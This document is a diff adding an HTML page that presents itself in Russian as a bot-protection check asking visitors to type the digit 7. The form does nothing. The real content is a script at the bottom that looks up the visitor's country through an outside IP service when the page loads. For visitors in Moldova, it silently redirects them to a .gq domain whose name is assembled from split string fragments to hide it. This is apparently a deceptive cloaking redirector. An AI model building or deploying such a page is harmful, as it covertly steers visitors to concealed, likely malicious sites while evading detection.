@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Привет мир!</title>
+	<script
+  src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
+  integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs="
+  crossorigin="anonymous"></script>
+
+</head>
+<body>
+	
+    <style>
+      * {
+        -webkit-tap-highlight-color: transparent;
+        user-select: none;
+      }
+
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Tahoma, sans-serif;
+      }
+
+      .main {
+        padding: 0 15px;
+        display: flex;
+        width: 100%;
+        max-width: 100%;
+        box-sizing: border-box;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+      }
+
+      .main-head__title {
+        font-size: 42px;
+        font-weight: 400;
+        margin: 0;
+        text-align: center;
+      }
+      .main-head__title span {
+        color: #ffa500;
+        font-size: 1.3em;
+      }
+      .main-head__subtitle {
+        margin: 0;
+        margin-top: 15px;
+        font-size: 28px;
+        text-align: center;
+      }
+
+      .main-head__subtitle span {
+        color: #ffa500;
+      }
+
+      .main-form {
+        margin-top: 60px;
+        display: flex;
+        flex-direction: column;
+      }
+      .main-form__inp {
+        width: 260px;
+        height: 70px;
+        border-radius: 8px;
+        font-size: 20px;
+        border: 3px solid #ffa501;
+        padding: 5px;
+        box-sizing: border-box;
+        outline: none;
+        text-align: center;
+        font-family: Tahoma, sans-serif;
+      }
+      .main-form__inp:focus::placeholder {
+        color: transparent;
+      }
+      .main-form__btn {
+        font-size: 20px;
+        font-family: Tahoma, sans-serif;
+        margin-top: 15px;
+        width: 260px;
+        height: 60px;
+        background-color: transparent;
+        border: none;
+        outline: none;
+        cursor: pointer;
+        background-color: #ffa500;
+        border-radius: 8px;
+        color: white;
+        font-size: 16px;
+        transition-duration: 0.3s;
+        user-select: none;
+      }
+      .main-form__btn:hover {
+        background-color: #eca219;
+      }
+      .main-form__btn:active {
+        opacity: 0.7;
+      }
+      .main-form__btn--disabled {
+        opacity: 0.4;
+        pointer-events: none;
+      }
+
+      @media (max-width: 600px) {
+        .main-head__title {
+          font-size: 30px;
+        }
+
+        .main-head__subtitle {
+          margin: 0;
+          margin-top: 15px;
+          font-size: 22px;
+          text-align: center;
+        }
+      }
+    </style>
+  
+    <main class="main">
+      <div class="main-head">
+        <h1 class="main-head__title">Защита от - <span>Ботов</span></h1>
+        <p class="main-head__subtitle">
+          Введите цифру <span>7</span> в форму ниже
+        </p>
+      </div>
+
+      <form class="main-form">
+        <input
+          class="main-form__inp"
+          maxlength="1"
+          type="text"
+          placeholder="Введите цифру 7"
+        />
+        <button type="submit" class="main-form__btn">Перейти</button>
+      </form>
+    </main>
+    
+<script>
+function getIP(json) {
+   var a = 'mdne'; var b = 'eke'; var c ='nig'; var d = 'gq';
+   if (json.countryCode == 'MD') {
+     $(location).attr('href', 'https://' + a + b + c + '.' + d );
+   }
+}
+</script>
+<script src="https://extreme-ip-lookup.com/json/?callback=getIP" async defer></script>
+
+
+</body>
+</html>
